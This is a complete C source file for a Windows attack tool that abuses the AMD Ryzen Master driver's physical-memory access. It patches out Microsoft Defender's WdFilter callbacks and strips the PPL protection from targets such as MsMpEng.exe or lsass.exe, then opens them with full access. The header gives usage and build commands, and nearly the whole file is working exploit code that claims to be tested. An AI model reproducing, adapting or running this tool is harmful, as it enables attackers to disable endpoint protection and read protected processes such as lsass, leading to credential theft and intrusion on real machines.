/*
 * ppl_bypass.c — PPL Bypass via AMDRyzenMasterDriverV20
 *
 * Confirmed working mechanism (tested):
 *   1. Scan RAM → find target EPROCESS + self EPROCESS + WdFilter callbacks
 *   2. Find WdFilter image in physical RAM (scan for PE header)
 *   3. Patch ALL WdFilter PreOp function bytes to 0xC3 (RET)
 *   4. Zero ALL WdFilter callback entry PreOp pointers
 *   5. Clear target EPROCESS.Protection → elevate self Protection = 0x31
 *   6. 256MB cache eviction → force kernel to re-read from DRAM (sees zeros)
 *   7. OpenProcess(PROCESS_ALL_ACCESS)
 *   8. Restore everything immediately
 *
 * Why this works:
 *   - AMD driver writes MmNonCached (UC) → goes direct to DRAM
 *   - 256MB eviction clears L3 cache
 *   - Kernel reads PreOp pointer: L3 miss → DRAM (= 0) → skips callback
 *   - EPROCESS page is cold (~6.5GB PA) → UC write visible on first kernel read
 *
 * Bug fixed vs previous attempts:
 *   - Old code only zeroed Callback#1, missed Callback#2 (WdFilter+0x24058)
 *   - Callback#2 (ops=OB_OPERATION_HANDLE_CREATE) was still active → blocked
 *
 * Usage:
 *   ppl_bypass.exe MsMpEng.exe
 *   ppl_bypass.exe lsass.exe         (use --force for signer>3)
 *   ppl_bypass.exe --force lsass.exe
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -o ppl_bypass.exe ppl_bypass.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ── Driver ─────────────────────────────────────────────────────────────── */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* ── Physical ranges ─────────────────────────────────────────────────────── */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i=0;;i++) {
        vn=sizeof vname; vd=0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf=(uint8_t*)malloc(vd); if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size)
            return 1;
    return 0;
}

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in_buf[12];
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    uint32_t out_sz = 12+sz;
    uint8_t *out = (uint8_t*)calloc(1, out_sz); if (!out) return 0;
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                              in_buf, sizeof(in_buf), out, out_sz, &got, NULL);
    if (ok && got>=12) memcpy(buf, out+12, sz);
    free(out); return ok && got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if (!pa_in_range(pa, sz)) return 0;
    uint32_t in_sz = 12+sz;
    uint8_t *in_buf = (uint8_t*)malloc(in_sz); if (!in_buf) return 0;
    *(uint64_t*)(in_buf) = pa; *(uint32_t*)(in_buf+8) = sz;
    memcpy(in_buf+12, data, sz);
    DWORD got=0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                              in_buf, in_sz, NULL, 0, &got, NULL);
    free(in_buf); return ok;
}

/* Write + readback verify: catch silent fails (MmMapIoSpace NULL for some PAs) */
static int phys_write_v(uint64_t pa, const void *data, uint32_t sz)
{
    if (!phys_write(pa, data, sz)) return 0;
    uint8_t buf[8]={0};
    if (!phys_read(pa, buf, sz<8?sz:8)) return 0;
    return memcmp(buf, data, sz<8?sz:8)==0;
}

/* ── Cache eviction ──────────────────────────────────────────────────────────
 * AMD driver uses MmNonCached (UC) → writes bypass CPU cache, go direct DRAM.
 * Kernel reads via WB cache → sees stale value.
 * Fix: thrash 256MB > any Ryzen L3 → evict all cache lines including target.
 * After eviction: kernel read = cache miss → fetch from DRAM → sees our write.
 */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict(void)
{
    volatile uint8_t *p = (volatile uint8_t*)
        VirtualAlloc(NULL, EVICT_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!p) { Sleep(100); return; }
    for (size_t i=0; i<EVICT_SIZE; i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for (size_t i=EVICT_SIZE; i>=64; i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p, 0, MEM_RELEASE);
    Sleep(10);
}

/* Run eviction on CPU 0 then the last CPU to cover both CCDs on dual-CCD Ryzen.
 * Each CCD has an independent L3; a single-core eviction only flushes one CCD. */
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD ncpu = si.dwNumberOfProcessors;
    HANDLE thr  = GetCurrentThread();
    DWORD_PTR orig = SetThreadAffinityMask(thr, 1);

    SetThreadAffinityMask(thr, 1ULL);
    Sleep(1);
    cache_evict();

    if (ncpu > 1) {
        SetThreadAffinityMask(thr, (DWORD_PTR)1 << (ncpu - 1));
        Sleep(1);
        cache_evict();
    }

    SetThreadAffinityMask(thr, orig);
}

/* ── NtQSI module list ───────────────────────────────────────────────────── */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase, ImageBase;
    ULONG  ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                            "NtQuerySystemInformation");
    if (!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do { free(ml); ml=(MOD_LIST*)malloc(sz*=2); st=fn(11,ml,sz,NULL); }
    while (st==(NTSTATUS)0xC0000004L);
    if (st){free(ml);return NULL;}
    return ml;
}

static int get_module_range(const char *name, uint64_t *base, uint64_t *size)
{
    MOD_LIST *ml=get_module_list(); if (!ml) return 0;
    for (ULONG i=0;i<ml->NumberOfModules;i++){
        char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        if (_stricmp(fn,name)==0){
            *base=(uint64_t)ml->Modules[i].ImageBase;
            *size=ml->Modules[i].ImageSize;
            free(ml); return 1;
        }
    }
    free(ml); return 0;
}

/* ── Toolhelp PID ────────────────────────────────────────────────────────── */
static uint32_t get_pid(const char *name)
{
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe={sizeof pe}; uint32_t found=0;
    if (Process32First(snap,&pe)) do {
        if (_stricmp(pe.szExeFile,name)==0){found=pe.th32ProcessID;break;}
    } while (Process32Next(snap,&pe));
    CloseHandle(snap); return found;
}

/* ── EPROCESS offsets (Win10 / Win11 <24H2) ─────────────────────────────── */
static uint32_t OFF_PID   = 0x440;
static uint32_t OFF_FLINK = 0x448;
static uint32_t OFF_BLINK = 0x450;
static uint32_t OFF_TOKEN = 0x4B8;
static uint32_t OFF_NAME  = 0x5A8;
static uint32_t OFF_PROT  = 0x87A;
#define EPROC_READ_SZ 0x5C0

static void detect_offsets(void)
{
    typedef LONG (WINAPI *pfnRtlGetVersion)(OSVERSIONINFOW*);
    OSVERSIONINFOW ov={sizeof ov};
    pfnRtlGetVersion fn=(pfnRtlGetVersion)
        GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetVersion");
    if (fn) fn(&ov);
    if (ov.dwBuildNumber >= 26100) {
        OFF_PID=0x440; OFF_FLINK=0x448; OFF_BLINK=0x450;
        OFF_TOKEN=0x4B8; OFF_NAME=0x5A8; OFF_PROT=0x4FA;
        printf("[*] Win11 24H2+  OFF_PROT=0x4FA\n");
    } else {
        printf("[*] Win10/Win11 <24H2  OFF_PROT=0x87A\n");
    }
}

/* ── 64KB chunk scan buffer ─────────────────────────────────────────────── */
#define CHUNK 0x10000
static uint8_t g_chunk[CHUNK];

/* ── EPROCESS scan (target PID + self PID) ───────────────────────────────── */
typedef struct {
    uint64_t pa;
    uint32_t pid;
    uint8_t  prot;
    char     name[16];
} EprocEntry;

static void scan_eprocess(uint32_t tgt_pid, const char *tgt_name,
                          uint32_t self_pid,
                          EprocEntry *tgt_out, EprocEntry *self_out)
{
    uint8_t ep[EPROC_READ_SZ];
    uint64_t last_prog=0;

    for (int ri=0;ri<g_nranges;ri++){
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t cpa=g_ranges[ri].base;cpa<end;cpa+=CHUNK){
            if (tgt_out->pa && self_out->pa) return;

            if (cpa-last_prog>=0x40000000ULL){
                printf("  [%5llu MB]  tgt=%s self=%s\n",
                       (unsigned long long)(cpa>>20),
                       tgt_out->pa?"OK":"--", self_out->pa?"OK":"--");
                last_prog=cpa;
            }
            uint64_t csz=end-cpa; if (csz>CHUNK) csz=CHUNK;
            if (!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;

            for (uint64_t off=0;off+8<=csz;off+=8){
                uint8_t c=g_chunk[off];
                if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;

                uint64_t abs=cpa+off;
                uint64_t epa=abs-OFF_NAME;
                if (!pa_in_range(epa,EPROC_READ_SZ)) continue;

                if (epa>=cpa && epa+EPROC_READ_SZ<=cpa+csz)
                    memcpy(ep, g_chunk+(epa-cpa), EPROC_READ_SZ);
                else
                    if (!phys_read(epa,ep,EPROC_READ_SZ)) continue;

                uint64_t pid=*(uint64_t*)(ep+OFF_PID);
                if (!pid||pid>0xFFFF) continue;
                if (memcmp(ep+OFF_NAME,g_chunk+off,4)) continue;

                int ok=1;
                for (int k=0;k<15;k++){
                    uint8_t nc=ep[OFF_NAME+k]; if (!nc) break;
                    if (nc<0x20||nc>0x7E){ok=0;break;}
                }
                if (!ok) continue;

                uint64_t token=*(uint64_t*)(ep+OFF_TOKEN);
                uint64_t flink=*(uint64_t*)(ep+OFF_FLINK);
                uint64_t blink=*(uint64_t*)(ep+OFF_BLINK);
                if ((token&~0xFULL)<0xFFFF800000000000ULL) continue;
                if (flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL) continue;

                uint32_t upid=(uint32_t)pid;
                char name[16]={0}; memcpy(name,ep+OFF_NAME,15);
                uint8_t prot=0;
                if (OFF_PROT<EPROC_READ_SZ) prot=ep[OFF_PROT];
                else phys_read(epa+OFF_PROT,&prot,1);

                if (!tgt_out->pa && upid==tgt_pid &&
                    _strnicmp(name,tgt_name,15)==0){
                    tgt_out->pa=epa; tgt_out->pid=upid; tgt_out->prot=prot;
                    memcpy(tgt_out->name,name,15);
                    printf("\n  [TARGET] PA=0x%016llX prot=0x%02X %s\n",
                           (unsigned long long)epa,prot,name);
                }
                if (!self_out->pa && upid==self_pid){
                    self_out->pa=epa; self_out->pid=upid; self_out->prot=prot;
                    memcpy(self_out->name,name,15);
                    printf("\n  [SELF]   PA=0x%016llX prot=0x%02X %s\n",
                           (unsigned long long)epa,prot,name);
                }
            }
        }
    }
}

/* ── WdFilter callback scan (collect all) ───────────────────────────────── */
#define MAX_CBS 8
static void scan_callbacks(uint64_t wdf_base, uint64_t wdf_size,
                            uint64_t cb_pa[MAX_CBS], uint64_t cb_preop[MAX_CBS],
                            uint64_t cb_postop[MAX_CBS], int *n_cbs)
{
    *n_cbs=0;
    uint64_t last_prog=0;

    for (int ri=0;ri<g_nranges;ri++){
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for (uint64_t cpa=g_ranges[ri].base;cpa<end;cpa+=CHUNK){
            if (*n_cbs>=MAX_CBS) return;
            if (cpa-last_prog>=0x80000000ULL){
                printf("  [%5llu MB] callbacks=%d\n",
                       (unsigned long long)(cpa>>20), *n_cbs);
                last_prog=cpa;
            }
            uint64_t csz=end-cpa; if (csz>CHUNK) csz=CHUNK;
            if (!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;

            /* Anchor: preop ∈ WdFilter VA range at offset +0x28 from entry start */
            for (uint64_t off=0x28;off+0x10<=csz&&*n_cbs<MAX_CBS;off+=8){
                uint64_t preop=*(uint64_t*)(g_chunk+off);
                if (preop<wdf_base||preop>=wdf_base+wdf_size) continue;

                uint64_t flink =*(uint64_t*)(g_chunk+off-0x28);
                uint64_t blink =*(uint64_t*)(g_chunk+off-0x20);
                uint32_t ops   =*(uint32_t*)(g_chunk+off-0x18);
                uint64_t cbent =*(uint64_t*)(g_chunk+off-0x10);
                uint64_t objt  =*(uint64_t*)(g_chunk+off-0x08);
                uint64_t postop=*(uint64_t*)(g_chunk+off+0x08);

                if (flink <0xFFFF800000000000ULL) continue;
                if (blink <0xFFFF800000000000ULL) continue;
                if (ops<1||ops>3) continue;
                if (cbent <0xFFFF800000000000ULL) continue;
                if (objt  <0xFFFF800000000000ULL) continue;
                if (postop&&postop<0xFFFF800000000000ULL) continue;
                if (flink==preop||blink==preop) continue;

                uint64_t entry_pa=cpa+(off-0x28);
                int dup=0;
                for (int d=0;d<*n_cbs;d++) if (cb_pa[d]==entry_pa){dup=1;break;}
                if (dup) continue;

                cb_pa[*n_cbs]=entry_pa;
                cb_preop[*n_cbs]=preop;
                cb_postop[*n_cbs]=postop;
                printf("\n  [CB#%d] PA=0x%016llX ops=%u preop=WdFilter+0x%llX\n",
                       *n_cbs+1,(unsigned long long)entry_pa,ops,
                       (unsigned long long)(preop-wdf_base));
                (*n_cbs)++;
            }
        }
    }
}

/* ── WdFilter image PA (scan first 2GB for PE header) ───────────────────── */
static uint64_t find_wdf_image_pa(uint64_t wdf_size)
{
    uint8_t page[0x1000];
    uint64_t scan_end=0x80000000ULL;

    for (int ri=0;ri<g_nranges;ri++){
        uint64_t base=g_ranges[ri].base;
        uint64_t end =g_ranges[ri].base+g_ranges[ri].size;
        if (end>scan_end) end=scan_end;

        for (uint64_t pa=(base+0xFFF)&~0xFFFULL; pa+0x1000<=end; pa+=0x1000){
            if (!phys_read(pa,page,0x1000)) continue;
            if (page[0]!='M'||page[1]!='Z') continue;
            int32_t elf=*(int32_t*)(page+0x3C);
            if (elf<0x40||elf+0x58>0x1000) continue;
            if (*(uint32_t*)(page+elf)!=0x00004550) continue;
            if (*(uint16_t*)(page+elf+4)!=0x8664) continue;
            if (*(uint16_t*)(page+elf+24)!=0x020B) continue;
            uint32_t soi=*(uint32_t*)(page+elf+0x50);
            if (soi!=(uint32_t)wdf_size) continue;
            printf("  [+] WdFilter image at PA=0x%016llX\n",(unsigned long long)pa);
            return pa;
        }
    }
    return 0;
}

/* ════════════════════════════════════════════════════════════════════════ */
int main(int argc, char **argv)
{
    const char *target_name = "MsMpEng.exe";
    int force_signer = 0;

    if (argc>=2){
        if (strcmp(argv[1],"--force")==0 && argc>=3){
            force_signer=1; target_name=argv[2];
        } else {
            target_name=argv[1];
        }
    }

    SetConsoleOutputCP(CP_UTF8);
    printf("=== PPL Bypass --- AMD Ryzen Master Driver ===\n");
    printf("    Target: %s%s\n\n", target_name, force_signer?" (--force)":"");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,
                      0,NULL,OPEN_EXISTING,0,NULL);
    if (g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open device: %lu\n",GetLastError()); return 1;
    }
    printf("[+] Device opened\n\n");

    /* Enable SeDebugPrivilege — needed for PROCESS_ALL_ACCESS DACL bypass */
    {
        HANDLE hTok;
        TOKEN_PRIVILEGES tp = {1};
        if (OpenProcessToken(GetCurrentProcess(),
                             TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hTok)) {
            LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
                                  &tp.Privileges[0].Luid);
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            BOOL ok = AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
            DWORD e = GetLastError();
            printf("[*] SeDebugPrivilege: %s\n\n",
                   (ok && e==0) ? "enabled" : "FAILED (run as admin)");
            CloseHandle(hTok);
        }
    }

    detect_offsets();
    load_ranges();
    printf("[1] Physical ranges: %d\n\n", g_nranges);

    /* ── Target PID ─────────────────────────────────────────────────────── */
    uint32_t target_pid = get_pid(target_name);
    if (!target_pid){ printf("[-] %s not found\n",target_name); CloseHandle(g_dev); return 1; }
    printf("[2] Target PID = %u\n", target_pid);

    HANDLE h_pre = OpenProcess(PROCESS_ALL_ACCESS,FALSE,target_pid);
    if (h_pre){ printf("[!] Already openable (no PPL?)\n"); CloseHandle(h_pre); }
    else printf("    OpenProcess before bypass: FAIL err=%lu — PPL confirmed\n\n",
                GetLastError());

    /* ── WdFilter range ──────────────────────────────────────────────────── */
    printf("[3] WdFilter module range...\n");
    uint64_t wdf_base=0, wdf_size=0;
    if (!get_module_range("WdFilter.sys",&wdf_base,&wdf_size)){
        printf("    [!] WdFilter not loaded — callback scan skipped\n\n");
    } else {
        printf("    VA=0x%016llX  size=0x%llX\n\n",
               (unsigned long long)wdf_base,(unsigned long long)wdf_size);
    }

    /* ── Single-pass scan: target EPROCESS + self EPROCESS + callbacks ───── */
    printf("[4] RAM scan (EPROCESS + WdFilter callbacks)...\n\n");
    EprocEntry tgt_ep={0}, self_ep={0};
    uint64_t cb_pa[MAX_CBS]={0}, cb_preop[MAX_CBS]={0}, cb_postop[MAX_CBS]={0};
    int n_cbs=0;

    /* Run EPROCESS scan */
    scan_eprocess(target_pid, target_name, GetCurrentProcessId(),
                  &tgt_ep, &self_ep);

    /* Run callback scan */
    if (wdf_base && wdf_size)
        scan_callbacks(wdf_base, wdf_size, cb_pa, cb_preop, cb_postop, &n_cbs);

    printf("\n\n[4] Results:\n");
    printf("    Target   PA=0x%016llX  prot=0x%02X  %s\n",
           (unsigned long long)tgt_ep.pa, tgt_ep.prot, tgt_ep.name);
    printf("    Self     PA=0x%016llX  prot=0x%02X\n",
           (unsigned long long)self_ep.pa, self_ep.prot);
    printf("    Callbacks found: %d\n", n_cbs);
    for (int i=0;i<n_cbs;i++)
        printf("    [%d] CB PA=0x%016llX  preop=WdFilter+0x%llX\n",
               i,(unsigned long long)cb_pa[i],
               (unsigned long long)(cb_preop[i]-wdf_base));

    if (!tgt_ep.pa){
        printf("\n[-] Target EPROCESS not found\n"); CloseHandle(g_dev); return 1;
    }
    if (!self_ep.pa)
        printf("[!] Self EPROCESS not found — self-elevation disabled\n\n");
    if (n_cbs==0)
        printf("[!] No WdFilter callbacks found — bypass may fail\n\n");

    uint8_t tgt_prot_orig = tgt_ep.prot;
    uint8_t sg=(tgt_prot_orig>>4)&0xF, tp=tgt_prot_orig&0x7;
    if ((sg>3||tp>1)&&!force_signer){
        printf("\n[!] Signer=%u type=%u — PatchGuard risk.\n",sg,tp);
        printf("    Use --force %s to bypass anyway.\n",target_name);
        CloseHandle(g_dev); return 1;
    }
    if (force_signer&&(sg>3||tp>1))
        printf("[!] --force: ignoring signer guard (signer=%u)\n\n",sg);

    /* ── Write diagnostic: confirm Protection clear reaches live EPROCESS ── */
    {
        typedef NTSTATUS (NTAPI *PFN)(HANDLE,ULONG,PVOID,ULONG,PULONG);
        PFN NtQIP=(PFN)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                       "NtQueryInformationProcess");
        HANDLE hq=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,target_pid);
        uint8_t z=0; phys_write(tgt_ep.pa+OFF_PROT,&z,1);
        UCHAR v=0xFF; if (hq&&NtQIP) NtQIP(hq,61,&v,1,NULL);
        phys_write(tgt_ep.pa+OFF_PROT,&tgt_prot_orig,1);
        if (hq) CloseHandle(hq);
        printf("\n[5] Write diagnostic: NtQIP after clear=0x%02X  %s\n\n",
               v, v==0?"[LIVE — write reaches kernel OK]":
                  "[STALE — phys_write not reaching live EPROCESS]");
        if (v!=0){
            printf("[-] Cannot proceed: stale EPROCESS PA\n");
            CloseHandle(g_dev); return 1;
        }
    }

    /* ── Find WdFilter image in physical RAM ──────────────────────────────── */
    printf("[6] Finding WdFilter image in first 2GB RAM...\n");
    uint64_t wdf_pa = (wdf_base&&wdf_size) ? find_wdf_image_pa(wdf_size) : 0;
    if (!wdf_pa) printf("    [!] WdFilter image not found — code patch skipped\n");
    printf("\n");

    /* Collect preop function PAs + orig bytes */
    uint64_t pp_pa[MAX_CBS]={0};
    uint8_t  pp_ob[MAX_CBS]={0};

    if (wdf_pa) {
        for (int i=0;i<n_cbs;i++){
            uint64_t rva=cb_preop[i]-wdf_base;
            uint64_t ppa=wdf_pa+rva;
            uint8_t  ob=0;
            if (pa_in_range(ppa,1)&&phys_read(ppa,&ob,1)){
                pp_pa[i]=ppa; pp_ob[i]=ob;
                printf("    [%d] preop PA=0x%llX orig=0x%02X\n",
                       i,(unsigned long long)ppa,ob);
            }
        }
    }

    printf("\n    --> Enter to proceed, Ctrl+C to abort: ");
    fflush(stdout); getchar(); printf("\n");

    /* ══════════════════════════════════════════════════════════════════════
     * BYPASS SEQUENCE:
     *   A. Patch WdFilter PreOp function code → 0xC3 (RET, no-op)
     *   B. Zero WdFilter callback entry PreOp pointers
     *   C. Clear target EPROCESS.Protection
     *   D. Elevate self EPROCESS.Protection = 0x31 (Antimalware/PPL)
     *   E. 256MB cache eviction → L3 flush → kernel re-reads from DRAM
     *   F. OpenProcess(PROCESS_ALL_ACCESS)
     *   G. Restore everything immediately
     *
     * Why two layers (A + B)?
     *   - B (zero pointer): D-cache → L3 eviction makes it visible → kernel
     *     reads pointer, sees 0x00 → skips callback entirely
     *   - A (RET patch): even if pointer visible, code also patched as backup
     *   - Together: belt + suspenders
     * ══════════════════════════════════════════════════════════════════════ */
    printf("[7] Bypass...\n\n");
    uint8_t ret_byte=0xC3, zero1=0, fake_prot=0x31;
    uint8_t zero8[8]={0};

    /* A. Code patch: ALL preop functions → 0xC3 */
    for (int i=0;i<n_cbs;i++){
        if (!pp_pa[i]) continue;
        int ok=phys_write_v(pp_pa[i],&ret_byte,1);
        printf("    [A] Code patch CB#%d PA=0x%llX: %s\n",
               i+1,(unsigned long long)pp_pa[i],ok?"OK":"FAIL");
    }

    /* B. Zero ALL callback entry PreOp + PostOp pointers */
    for (int i=0;i<n_cbs;i++){
        int ok1=phys_write_v(cb_pa[i]+0x28, zero8, 8);
        int ok2=phys_write_v(cb_pa[i]+0x30, zero8, 8);
        printf("    [B] Zeroed CB#%d PreOp=%s PostOp=%s\n",
               i+1, ok1?"OK":"FAIL", ok2?"OK":"FAIL");
    }

    /* C. Clear target Protection */
    int c_ok=phys_write_v(tgt_ep.pa+OFF_PROT, &zero1, 1);
    printf("    [C] Target Protection cleared%s\n", c_ok?"":" — WARN: verify failed");

    /* D. Elevate self to Antimalware/PPL */
    if (self_ep.pa){
        phys_write(self_ep.pa+OFF_PROT, &fake_prot, 1);
        printf("    [D] Self elevated to 0x31\n");
    }

    /* E. Cache eviction on both CCDs → force kernel to re-read from DRAM */
    printf("    [E] Cache eviction (multi-CCD)... "); fflush(stdout);
    cache_evict_multiccd();
    printf("done\n");

    /* F. OpenProcess */
    printf("    [F] OpenProcess(PROCESS_ALL_ACCESS, %u)...\n", target_pid);
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

    /* G. Restore IMMEDIATELY regardless of result */
    if (self_ep.pa) phys_write(self_ep.pa+OFF_PROT, &self_ep.prot, 1);
    phys_write(tgt_ep.pa+OFF_PROT, &tgt_prot_orig, 1);
    for (int i=0;i<n_cbs;i++){
        if (pp_pa[i]) phys_write(pp_pa[i], &pp_ob[i], 1);
        phys_write(cb_pa[i]+0x28, &cb_preop[i], 8);
        if (cb_postop[i]) phys_write(cb_pa[i]+0x30, &cb_postop[i], 8);
    }
    printf("    [G] All restored\n\n");

    if (!hProc){
        DWORD err=GetLastError();
        printf("[-] FAILED (err=%lu)\n\n", err);
        printf("    Diagnostics:\n");
        if (n_cbs==0)
            printf("    - WdFilter callbacks not found (scan miss?)\n");
        if (!wdf_pa)
            printf("    - WdFilter image not found (code patch skipped)\n");
        printf("    - Try running immediately after boot (fewer hot cache lines)\n");
        CloseHandle(g_dev); return 1;
    }

    printf("[+] SUCCESS!  Handle=0x%p\n\n", (void*)hProc);

    char img[MAX_PATH]={0}; DWORD isz=sizeof img;
    if (QueryFullProcessImageNameA(hProc,0,img,&isz))
        printf("    Image: %s\n", img);

    /* ── Confirm: query protection (should be restored 0x31) ─────────────── */
    typedef NTSTATUS (NTAPI *PFN2)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    PFN2 NtQIP2=(PFN2)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                      "NtQueryInformationProcess");

    UCHAR prot_now=0xFF;
    if (NtQIP2) NtQIP2(hProc,61,&prot_now,1,NULL);
    printf("    Protection now : 0x%02X  (%s)\n", prot_now,
           prot_now==0x31?"restored to PPL-Antimalware [expected]":"unexpected");

    /* ── Confirm: get PEB + ReadProcessMemory to prove VM_READ works ──────── */
    PROCESS_BASIC_INFORMATION pbi={0}; ULONG ret=0;
    if (NtQIP2) NtQIP2(hProc,0,&pbi,sizeof pbi,&ret);
    printf("    PEB base       : 0x%p\n", pbi.PebBaseAddress);

    if (pbi.PebBaseAddress) {
        uint8_t peb_hdr[16]={0}; SIZE_T nread=0;
        BOOL ok=ReadProcessMemory(hProc,pbi.PebBaseAddress,peb_hdr,sizeof peb_hdr,&nread);
        printf("    ReadProcessMemory PEB[0..15]: ");
        if (ok && nread==16){
            for (int i=0;i<16;i++) printf("%02X ",peb_hdr[i]);
            printf("\n    --> VM_READ on PPL process: CONFIRMED\n");
        } else {
            printf("FAIL err=%lu\n", GetLastError());
        }
    }

    CloseHandle(hProc);
    CloseHandle(g_dev);
    printf("\nDone.\n");
    return 0;
}
